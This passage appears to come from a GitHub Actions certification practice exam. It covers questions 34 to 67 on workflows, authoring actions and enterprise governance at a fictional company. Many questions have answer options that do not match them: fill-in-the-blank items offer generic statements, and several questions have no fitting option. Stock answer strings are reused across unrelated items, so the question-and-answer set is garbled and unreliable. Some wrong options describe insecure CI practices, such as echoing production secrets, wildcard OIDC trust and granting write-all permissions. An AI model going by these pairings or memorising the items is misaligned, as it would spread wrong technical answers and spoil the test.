- **A.** Delete `.github/workflows` to hide red checks → Re-run all 48 green matrix legs ten times without reading logs → Run `echo ${{ secrets.PROD_KEY }}` in bash → Set `continue-on-error: true` permanently on test steps
- **B.** Map the failed job in the run graph to its `matrix` axes → Check step logs for the first non-zero exit / `::error::` → Run `Re-run failed jobs` with `Enable debug logging` → Push the fix and verify all matrix variants pass
- **C.** Wait 90 days until workflow logs expire → Mask exit codes with `|| true` across test scripts → Fire unrelated `release` webhooks manually → Search `_diag/` logs on developer laptops
- **D.** Leave `ACTIONS_STEP_DEBUG=true` enabled org-wide forever → SSH directly into standard GitHub-hosted runner VMs on port 22 → Download test artifacts before the upload step executes → Bypass branch protection to merge broken code

### 34. An automation script in `heliosgrid/dispatch-hub` needs to list recent workflow runs triggered by `actor` `release-bot` on workflow `deploy.yml` as structured JSON (`databaseId`, `headSha`, `conclusion`) using GitHub CLI. Complete the CLI command: `gh run list --workflow deploy.yml --user release-bot ____ databaseId,headSha,conclusion`.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Query workflow runs and raw ZIP logs via `gh run list` / `gh run view --log-failed` or REST `GET /repos/{owner}/{repo}/actions/runs/{run_id}/logs` (`HTTP 302` signed URL)
- **C.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **D.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name

### 35. During an outage postmortem at HeliosGrid Telemetry, you retrieve job-level logs for single `job_id = 33091822` via REST API AND watch an active live run in your terminal via GitHub CLI. Which two interfaces accomplish those tasks? Select two.

- **A.** Query workflow runs and raw ZIP logs via `gh run list` / `gh run view --log-failed` or REST `GET /repos/{owner}/{repo}/actions/runs/{run_id}/logs` (`HTTP 302` signed URL)
- **B.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **C.** Manage v4 immutable artifacts (`actions/upload-artifact@v4` creates immediate finalized artifacts; use unique names per matrix leg + `download-artifact@v4` `pattern:` + `merge-multiple: true`)
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **E.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **F.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 36. In `heliosgrid/firmware-sdk`, 6 matrix legs upload artifacts named `elf-arm-debug`, `elf-arm-release`, `elf-riscv-debug`, etc. Downstream job `bundle-release` wants all 6 extracted directly into `./dist/firmware/` in a single step without subdirectories per artifact name. Complete the `actions/download-artifact@v4` `with:` inputs: `pattern: elf-*`, `path: ./dist/firmware`, and `____: true`.

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **D.** Manage v4 immutable artifacts (`actions/upload-artifact@v4` creates immediate finalized artifacts; use unique names per matrix leg + `download-artifact@v4` `pattern:` + `merge-multiple: true`)

### 37. An external partner downloads artifact `compliance-bundle` via REST endpoint `GET /repos/heliosgrid/meter-sync/actions/artifacts/{artifact_id}/zip`. How does the REST API format artifact downloads compared to `actions/download-artifact@v4` inside a workflow job?

- **A.** Manage v4 immutable artifacts (`actions/upload-artifact@v4` creates immediate finalized artifacts; use unique names per matrix leg + `download-artifact@v4` `pattern:` + `merge-multiple: true`)
- **B.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **C.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **D.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback

### 38. In `heliosgrid/dispatch-hub`, caller workflow `release.yml` sets workflow-level `env: DEPLOY_TIER: gold` and calls `jobs.deploy.uses: heliosgrid/ci-templates/.github/workflows/helm-sync.yml@<sha>`. Inside `helm-sync.yml`, `echo "$DEPLOY_TIER"` prints an empty string! Why?

- **A.** Invoke reusable workflows at `jobs.<id>.uses: org/repo/.github/workflows/file.yml@<sha>` (`<=4` nesting levels, executing in the caller repo context)
- **B.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 39. When caller workflow `ci.yml` in `heliosgrid/meter-sync` (`permissions: contents: write, packages: write`) calls reusable workflow `heliosgrid/ci-templates/.github/workflows/scan.yml@<sha>`, how can the caller restrict `GITHUB_TOKEN` permissions granted to `scan.yml`?

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Invoke reusable workflows at `jobs.<id>.uses: org/repo/.github/workflows/file.yml@<sha>` (`<=4` nesting levels, executing in the caller repo context)
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 40. HeliosGrid Telemetry published starter template `heliosgrid/.github/workflow-templates/python-ci.yml` last year, which 65 microservices instantiated via `Actions -> New workflow`. Today you update `python-ci.yml` in `heliosgrid/.github` from Python `3.11` to `3.13`. Proposed solution: Push the edit to `heliosgrid/.github/workflow-templates/python-ci.yml` so all 65 existing repositories automatically run Python `3.13` on their next commit. Does this meet the goal?

- **A.** Invoke reusable workflows at `jobs.<id>.uses: org/repo/.github/workflows/file.yml@<sha>` (`<=4` nesting levels, executing in the caller repo context)
- **B.** No — a **Starter workflow** (`.github/workflow-templates/`) copies a one-time static `.yml` file into target repos; future edits never propagate unless you use a `workflow_call` Reusable Workflow
- **C.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **D.** Contrast **Starter workflows** (`one-time copied .yml scaffold in <org>/.github/workflow-templates/`, independent afterward) vs **Reusable workflows** (`central workflow_call job`) vs **Composite actions** (`encapsulated steps`)

### 41. You author `heliosgrid/.github/workflow-templates/rust-service.yml` and `rust-service.properties.json` so GitHub suggests the template primarily for Rust repositories and fills in the repository's default branch automatically. Which two starter-template conventions achieve this? Select two.

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Contrast **Starter workflows** (`one-time copied .yml scaffold in <org>/.github/workflow-templates/`, independent afterward) vs **Reusable workflows** (`central workflow_call job`) vs **Composite actions** (`encapsulated steps`)
- **C.** No — a **Starter workflow** (`.github/workflow-templates/`) copies a one-time static `.yml` file into target repos; future edits never propagate unless you use a `workflow_call` Reusable Workflow
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **E.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **F.** Publish one-time scaffold templates in `<org>/.github/workflow-templates/*.yml` + `.properties.json`, and centralize ongoing governed CI logic in `workflow_call` reusable workflows

### 42. An engineer deletes obsolete `.github/workflows/legacy-svn-mirror.yml` on branch `main` in `heliosgrid/grid-ingest`, yet deleted workflow entries still clutter the left sidebar of the Actions tab with old failing runs. How do you remove obsolete run entries cleanly vs simply pausing a workflow?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`

### 43. Workflow `chaos-drill.yml` (`triggers: push, schedule, workflow_dispatch`) in `heliosgrid/dispatch-hub` was disabled via the Actions UI (`Disable workflow`). Can `push` or `schedule` events still start `chaos-drill.yml` while it remains in the `Disabled` state?

- **A.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **B.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **C.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **D.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release

---

## Domain 3 — Author and maintain actions (15–20% official weight · 19 questions)

### 44. HeliosGrid Telemetry builds JavaScript action `heliosgrid/ot-change-ticket` using `@actions/github` to comment on pull requests via an authenticated Octokit client. Complete the `@actions/github` helper call that constructs a pre-authenticated REST/GraphQL client from `token` input: `const octokit = github.____(token);` (`alongside github.context`).

- **A.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **B.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **C.** Build **JavaScript actions** (`runs.using: "node20"`, `pre:`/`main:`/`post:` entrypoints, `@actions/core` + `@actions/github`, bundled into `dist/index.js`) for fast cross-OS execution
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 45. In `action.yml` for JavaScript action `heliosgrid/cache-warmer`, `pre: dist/pre.js` should run ONLY on Linux runners (`runner.os == 'Linux'`), while `main: dist/index.js` runs on all OSes. Which `runs:` conditional key controls `pre:` execution without writing OS guards inside JavaScript?

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Build **JavaScript actions** (`runs.using: "node20"`, `pre:`/`main:`/`post:` entrypoints, `@actions/core` + `@actions/github`, bundled into `dist/index.js`) for fast cross-OS execution
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 46. HeliosGrid Telemetry's platform team creates a cross-OS `node20` action `heliosgrid/mqtt-schema-validate` written in TypeScript. Put the metadata definition, `@actions/core` implementation, `@vercel/ncc` bundling, and SemVer/SHA release steps in exact order.

- **A.** Author `action.yml` (`using: "node20"`, `main: "dist/index.js"`) → Code with `@actions/core` & `core.setFailed()` → Bundle into `dist/index.js` (`@vercel/ncc`) & commit `dist/` → Tag `v1.0.0`, slide `v1`, and document the 40-char SHA
- **B.** Cut release `v1.0.0` before authoring `action.yml` → Require every caller repo to run `npm install` first → Embed static caller tokens inside `dist/index.js` → Delete the Git tag right after release
- **C.** Gitignore both `dist/` and `node_modules/` in the release commit → Set `runs.using: "node12"` in `action.yml` → Exit raw processes without `@actions/core` → Tell consumers to reference floating `@main` only
- **D.** Place `action.yml` inside `.github/workflows/` with no root metadata → Set `runs.using: "docker"` for a macOS/Windows helper action → Log secret inputs via `console.log` → Skip SemVer tags completely

### 47. HeliosGrid Telemetry packages legacy vendor binary `iec61850-lint` (`compiled strictly for Debian 12 glibc with 14 system .so libraries`) into a custom action consumed only on Linux runners. Why is a Docker container action (`runs.using: 'docker'`) the best fit here, and which directory is automatically bind-mounted as container `WORKDIR`?

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **C.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **D.** Choose **Docker container actions** (`runs.using: "docker"`, custom OS/packages, **Linux runners only**) vs **Composite actions** (`runs.using: "composite"`, cross-OS bundled steps with explicit `shell:`)

### 48. HeliosGrid Telemetry develops an iOS/Windows field-technician diagnostic app tested on `macos-15` and `windows-2025` runners and wants one shared custom action to configure SDK certificates. Proposed solution: Build the shared certificate helper as a Docker container action (`runs.using: 'docker'`) and invoke it across `macos-15`, `windows-2025`, and `ubuntu-24.04` jobs. Does this meet the goal?

- **A.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **B.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **C.** Build **JavaScript actions** (`runs.using: "node20"`, `pre:`/`main:`/`post:` entrypoints, `@actions/core` + `@actions/github`, bundled into `dist/index.js`) for fast cross-OS execution
- **D.** Choose **Docker container actions** (`runs.using: "docker"`, custom OS/packages, **Linux runners only**) vs **Composite actions** (`runs.using: "composite"`, cross-OS bundled steps with explicit `shell:`)

### 49. You author Composite action `heliosgrid/rust-audit-composite/action.yml` that takes `inputs.deny-warnings`, runs two shell steps (`step 1 id: scan`), and exposes `outputs.report-json` to caller workflows. Which two YAML elements are mandatory inside `action.yml`? Select two.

- **A.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **B.** Choose **Docker container actions** (`runs.using: "docker"`, custom OS/packages, **Linux runners only**) vs **Composite actions** (`runs.using: "composite"`, cross-OS bundled steps with explicit `shell:`)
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Declare `runs.using: "composite"` in `action.yml`, specify `shell:` on every `run:` step, and reference helper scripts via `${{ github.action_path }}`
- **E.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **F.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`

### 50. After HeliosGrid Telemetry enables Immutable Actions on `heliosgrid/iec-validator`, hosted `ubuntu-latest` workflows resolve the immutable OCI action package transparently, while an older self-hosted runner behind a corporate firewall fails to download the action package. Which registry endpoints must the self-hosted firewall permit?

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Adopt **Immutable Actions** (`OCI packages on GHCR / pkg.actions.githubusercontent.com` + Immutable Releases) and fail cleanly with `core.setFailed(err.message)` (`exit code 1`)
- **D.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions

### 51. A Docker container action (`Dockerfile` with custom `ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]`) ignores `runs.args` passed from `action.yml` because `entrypoint.sh` ends with `exit 0` without reading `"$@"`. How does GitHub Actions pass `runs.args` (`or caller with: args`) to a Docker container action?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **C.** Adopt **Immutable Actions** (`OCI packages on GHCR / pkg.actions.githubusercontent.com` + Immutable Releases) and fail cleanly with `core.setFailed(err.message)` (`exit code 1`)
- **D.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`

### 52. In `action.yml` for `heliosgrid/semver-bump`, you mark legacy input `old-token` as deprecated while keeping backward compatibility for `v1` callers. Complete the `inputs.old-token` property `____: 'Use github-token instead'` that logs a native warning whenever a workflow passes `old-token`.

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Define `action.yml` (`or action.yaml`) with `name`, `description`, `inputs` (`required`, `default`, `deprecationMessage`), `outputs`, `runs`, and Marketplace `branding` (`icon` + `color`)

### 53. HeliosGrid Telemetry maintains a public utility repo `heliosgrid/grid-tools` containing three actions in subfolders (`tools/a/action.yml`, `tools/b/action.yml`, `tools/c/action.yml`) and no root `action.yml`. Proposed solution: Tag a GitHub Release on `heliosgrid/grid-tools` to publish all three subfolder actions directly to GitHub Marketplace. Does this meet the goal?

- **A.** Define `action.yml` (`or action.yaml`) with `name`, `description`, `inputs` (`required`, `default`, `deprecationMessage`), `outputs`, `runs`, and Marketplace `branding` (`icon` + `color`)
- **B.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **C.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **D.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release

### 54. You review three custom actions at HeliosGrid Telemetry: a `node20` action, a `docker` action pulling a prebuilt GHCR image (`runs.image: 'docker://ghcr.io/...'`), and a `composite` action. Which three `action.yml` configuration patterns are valid? Select three.

- **A.** Define `action.yml` (`or action.yaml`) with `name`, `description`, `inputs` (`required`, `default`, `deprecationMessage`), `outputs`, `runs`, and Marketplace `branding` (`icon` + `color`)
- **B.** Declare `runs.using: "composite"` in `action.yml`, specify `shell:` on every `run:` step, and reference helper scripts via `${{ github.action_path }}`
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Target `runs.using: "node20"` in `action.yml` and commit compiled `dist/index.js` (`bundled with @vercel/ncc or esbuild`) so consumers skip `npm install`
- **E.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **F.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions

### 55. In `heliosgrid/ot-change-ticket` (`node20`), your TypeScript code parses a multi-line JSON response and exposes it as step output `ticket_payload` plus attaches a file/line warning on `config/grid.yaml` line `19`. Complete the `@actions/core` calls: `core.____('ticket_payload', jsonStr)` and `core.warning('Drift detected', { file: 'config/grid.yaml', startLine: 19 })`.

- **A.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Use `@actions/core` (`getInput`, `setOutput`, `setSecret`, `exportVariable`, `addPath`, `saveState`/`getState`, `core.summary`) rather than raw `process.env` string hacks
- **D.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step

### 56. Inside a Composite action, step 1 (`bash`) needs to fail the composite action step immediately when `jq` finds `critical_vulns > 0` AND emit an error annotation visible on the PR Checks tab. How does a Composite action signal failure and emit annotations?

- **A.** Use `@actions/core` (`getInput`, `setOutput`, `setSecret`, `exportVariable`, `addPath`, `saveState`/`getState`, `core.summary`) rather than raw `process.env` string hacks
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 57. HeliosGrid Telemetry runs a self-managed GitHub Enterprise Server (`GHES`) appliance disconnected from `github.com` internet access, yet developers need approved official `actions/*` (`such as setup-python and upload-artifact`). How do air-gapped GHES enterprises distribute upstream actions safely without opening full internet access?

- **A.** Distribute internal actions via `Internal`/`Private` enterprise repositories (`with Actions Access enabled`, single-repo or monorepo subfolders) vs `Public` OSS repositories
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 58. HeliosGrid Telemetry bundles 4 tightly coupled internal Composite actions (`setup-rust`, `cargo-clippy`, `cargo-deny`, `sbom-gen`) inside one `Internal` repository `heliosgrid/ci-actions` under subdirectories (`rust/clippy/action.yml`, etc.) since Marketplace publication is NOT needed. Can caller workflows invoke subfolder actions from an `Internal` repo?

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Distribute internal actions via `Internal`/`Private` enterprise repositories (`with Actions Access enabled`, single-repo or monorepo subfolders) vs `Public` OSS repositories
- **D.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release

### 59. You maintain public single-action repo `heliosgrid/modbus-frame-lint` listed on GitHub Marketplace (`v1.2.0`) and need to pull a broken listing from Marketplace search without deleting the public Git repository. Where can a maintainer delist a published Marketplace action?

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)

### 60. HeliosGrid Telemetry open-sources `heliosgrid/iec61850-scl-lint` for the energy community and wants to list `v1.0.0` on the public GitHub Marketplace. Place the repository layout, branding/metadata, account security, and Release publication steps in exact order.

- **A.** Reuse an existing official action `name` (`actions/checkout`) → Hide `action.yml` inside `.github/workflows/` → Email a `.zip` archive to GitHub Support → Tag `0.0.0-draft` without release notes
- **B.** Publish from an EMU user account (`where public repos are blocked`) → Omit `description` and `runs:` from `action.yml` → Commit production `.env` secrets into the repo → Use mutable tag `latest` only
- **C.** Create a `Public` single-action repo with root `action.yml` → Add unique `name`, `description`, `README`, & `branding` → Enable `2FA` & accept the Marketplace Developer Agreement → Draft a Release (`v1.0.0`) checking `Publish to Marketplace`
- **D.** Keep the action repository `Private` or `Internal` → Pack 6 actions in subfolders with no root `action.yml` → Skip `2FA` and the Marketplace Developer Agreement → Push branch `dev` without drafting a GitHub Release

### 61. Maintainers of `heliosgrid/iec61850-scl-lint` introduce a breaking input rename (`schema-file` -> `scl-path`) and remove Node 16 compatibility. Under Semantic Versioning (`SemVer 2.0.0`) for GitHub Actions, which version tag should they cut, and should floating tag `v1` move to this commit?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Release immutable SemVer tags (`v1.2.0`), advance convenience major tags (`v1` -> `v1.2.0`) only for non-breaking changes, and recommend **40-char commit SHA** pinning (`with # v1.2.0 comment`)
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 62. HeliosGrid Telemetry's release playbook standardizes consumer guidance in `README.md` for all maintained actions. Which two versioning practices balance security and maintainability best? Select two.

- **A.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Release immutable SemVer tags (`v1.2.0`), advance convenience major tags (`v1` -> `v1.2.0`) only for non-breaking changes, and recommend **40-char commit SHA** pinning (`with # v1.2.0 comment`)
- **E.** Publish immutable SemVer releases (`v1.2.3`), slide major tag `v1` for compatible updates, and encourage consumers to pin full 40-char commit SHAs (`with Immutable Actions`)
- **F.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

---

## Domain 4 — Manage GitHub Actions for the enterprise (20–25% official weight · 24 questions)

### 63. HeliosGrid Telemetry organizes 220 repositories by regulatory tier using custom repository property `grid_criticality = NERC-CIP`. You want a central license-and-secret scan workflow in `heliosgrid/sec-ci` enforced automatically ONLY on repositories where `grid_criticality == NERC-CIP`. Which GitHub Enterprise feature targets required workflows dynamically via custom repository properties?

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Standardize CI/CD with central `Internal` Reusable Workflows (`workflow_call`) and enforce mandatory org/enterprise checks via **Repository Ruleset Required Workflows**
- **D.** No — a **Starter workflow** (`.github/workflow-templates/`) copies a one-time static `.yml` file into target repos; future edits never propagate unless you use a `workflow_call` Reusable Workflow

### 64. In HeliosGrid Telemetry's Enterprise account, platform engineers want a single catalog of golden `workflow_call` templates (`build-cpp.yml`, `container-attest.yml`) governed by `CODEOWNERS` (`@heliosgrid/platform-sec`) with mandatory signed commits and 2 PR approvals before any template change reaches downstream repos. How should the golden workflow repository be governed?

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Standardize CI/CD with central `Internal` Reusable Workflows (`workflow_call`) and enforce mandatory org/enterprise checks via **Repository Ruleset Required Workflows**
- **C.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **D.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name

### 65. A downstream team asks whether calling an enterprise `workflow_call` pipeline (`with 6 internal jobs`) counts against the caller workflow's job concurrency and billable runner minutes, or against the central template repository `heliosgrid/ci-templates`. Which repository owns execution billing and `GITHUB_TOKEN` scope?

- **A.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **B.** Standardize CI/CD with central `Internal` Reusable Workflows (`workflow_call`) and enforce mandatory org/enterprise checks via **Repository Ruleset Required Workflows**
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 66. Organization `heliosgrid-labs` creates a `Private` repository `heliosgrid-labs/fuzz-actions` and opens `Settings -> Actions -> General -> Access`. Unlike an `Internal` repository, can a `Private` repository on GitHub Enterprise Cloud share its actions/reusable workflows with sibling organizations in the same Enterprise?

- **A.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **D.** Set `Repository Settings -> Actions -> General -> Access` on `Internal`/`Private` action repos to `Accessible from repositories in the enterprise` (`or organization`)

### 67. An Enterprise Owner sets `Enterprise -> Policies -> Actions -> Repositories -> Enabled for selected organizations`, disabling Actions altogether for `heliosgrid-archive`. Can an Organization Owner of `heliosgrid-archive` re-enable GitHub Actions inside Organization Settings?

- **A.** Set `Repository Settings -> Actions -> General -> Access` on `Internal`/`Private` action repos to `Accessible from repositories in the enterprise` (`or organization`)
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
